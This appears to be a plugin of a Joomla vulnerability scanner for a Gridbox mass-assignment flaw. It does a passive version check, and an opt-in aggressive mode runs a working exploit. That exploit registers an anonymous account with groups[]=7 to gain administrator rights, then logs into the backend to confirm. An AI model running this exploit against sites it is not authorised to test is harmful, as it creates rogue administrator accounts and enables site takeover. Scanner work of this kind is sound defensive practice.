from __future__ import annotations

from typing import Any

from ...core.http import HttpClient, form_encode, is_transport_error, normalize_url, transport_error_detail
from ...core.models import Finding
from . import gridbox_common as gb

CVE_ID = "CVE-2026-65884"
NAME = "Gridbox registration group mass-assignment privilege escalation"
COMPONENT = "Gridbox (com_gridbox)"
HAS_EXPLOIT = True
INTRUSIVE = True
EXPLOIT_MODES = ["aggressive"]
AFFECTED_JOOMLA_VERSIONS = ["*"]
AFFECTED_RULE = "Gridbox 1.0.0 through 2.20.1"
FIXED_RULE = "Gridbox 2.20.2 or later"
REGISTER_PATH = "/index.php?option=com_gridbox&task=store.register"


def run_aggressive_probe(
    target_url: str,
    timeout: int = 12,
    proxy: str | None = None,
    admin_group: str = "7",
) -> Finding:
    base = normalize_url(target_url)
    client = HttpClient(timeout=timeout, proxy=proxy)
    preflight = client.get(f"{base}/", timeout=timeout)
    if is_transport_error(preflight):
        return Finding(
            cve=CVE_ID, name=NAME, status="ERROR", confidence="LOW",
            component=COMPONENT, affected_rule=AFFECTED_RULE,
            exploit_available=HAS_EXPLOIT, exploit_ran=True, proof_url=f"{base}/",
            detail=f"The target could not be reached ({transport_error_detail(preflight)}).",
            action="Retry when the target is reachable.",
        )

    username = "gbreg" + gb.random_suffix()
    password = gb.random_password()
    email = f"{username}@example.test"
    register = client.request(
        f"{base}{REGISTER_PATH}",
        method="POST",
        headers={"Content-Type": "application/x-www-form-urlencoded"},
        data=form_encode({
            "name": "Gridbox Lab Registrant",
            "username": username,
            "password1": password,
            "password2": password,
            "email1": email,
            "groups[]": admin_group,
        }),
        timeout=timeout,
        follow_redirects=False,
    )
    body = gb.json_body(register)
    created = body.get("status") is True
    admin_client = HttpClient(timeout=timeout, proxy=proxy)
    logged_in = gb.admin_login(admin_client, base, username, password, timeout)
    dashboard = logged_in and gb.admin_dashboard(admin_client, base, timeout)
    evidence: dict[str, object] = {
        "created_username": username,
        "requested_group": admin_group,
        "register_status": register.get("status"),
        "register_created": created,
        "backend_login": bool(dashboard),
    }
    if created and dashboard:
        return Finding(
            cve=CVE_ID, name=NAME, status="VULNERABLE", confidence="CONFIRMED",
            component=COMPONENT, affected_rule=AFFECTED_RULE,
            exploit_available=HAS_EXPLOIT, exploit_ran=True,
            proof_url=f"{base}{REGISTER_PATH}",
            evidence=evidence,
            detail=(
                f"An anonymous registration carrying groups[]={admin_group} created {username} with "
                "administrator group membership; the new account then logged into /administrator and "
                "loaded the control panel. No administrator approved the account."
            ),
            action=(
                "Upgrade Gridbox to 2.20.2 or later, remove unexpected administrator accounts "
                "(any group), and audit registrations and backend logins."
            ),
        )
    return Finding(
        cve=CVE_ID, name=NAME, status="NOT_CONFIRMED", confidence="MEDIUM",
        component=COMPONENT, affected_rule=AFFECTED_RULE,
        exploit_available=HAS_EXPLOIT, exploit_ran=True,
        proof_url=f"{base}{REGISTER_PATH}",
        evidence=evidence,
        detail=(
            "The crafted registration did not yield a backend-capable account "
            f"(created={created}, dashboard={dashboard})."
        ),
        action="Verify Gridbox runs 2.20.2 or later.",
    )


def check(
    target_url: str,
    joomla_version: str | None = None,
    run_exploit_check: bool = False,
    timeout: int = 12,
    proxy: str | None = None,
    exploit_mode: str = "safe",
    aggressive_command: str | None = None,
    aggressive_args: dict[str, Any] | None = None,
    plugins: dict | None = None,
    **kwargs: Any,
) -> Finding:
    result = gb.passive_gridbox(
        plugins,
        cve=CVE_ID, name=NAME, component=COMPONENT, affected_rule=AFFECTED_RULE,
        fixed_rule=FIXED_RULE, fixed="2.20.2",
        affected_detail="Gridbox is in the affected range; verify that groups[] is accepted on registration.",
        patched_detail="Gridbox forces the configured registration group and ignores request-supplied groups.",
        action="Upgrade Gridbox to 2.20.2 or later and audit administrator accounts.",
    )
    if not run_exploit_check:
        return result
    if exploit_mode != "aggressive":
        result.detail += " This CVE requires an aggressive lab-only registration proof."
        return result
    if result.status not in {"LIKELY_VULNERABLE", "INCONCLUSIVE"}:
        return result
    probe = run_aggressive_probe(target_url, timeout=timeout, proxy=proxy)
    probe.component_version = result.component_version
    return probe


def affects_joomla_version(joomla_version: str | None) -> bool:
    return True


def metadata() -> dict[str, Any]:
    return {
        "cve": CVE_ID, "cms": "joomla", "name": NAME, "component": COMPONENT,
        "affected_rule": AFFECTED_RULE, "affected_joomla_versions": AFFECTED_JOOMLA_VERSIONS,
        "exploit_available": HAS_EXPLOIT, "exploit_modes": EXPLOIT_MODES, "intrusive": INTRUSIVE,
        "vulnerability_type": "Privilege Escalation",
        "module_version": "1.0.0", "last_reviewed": "2026-11-11", "updated": "2026-11-11",
        "required_detectors": ["gridbox"],
        "references": [
            "https://www.cve.org/CVERecord?id=CVE-2026-65884",
            "https://mysites.guru/blog/gridbox-23-critical-vulnerabilities/",
        ],
    }
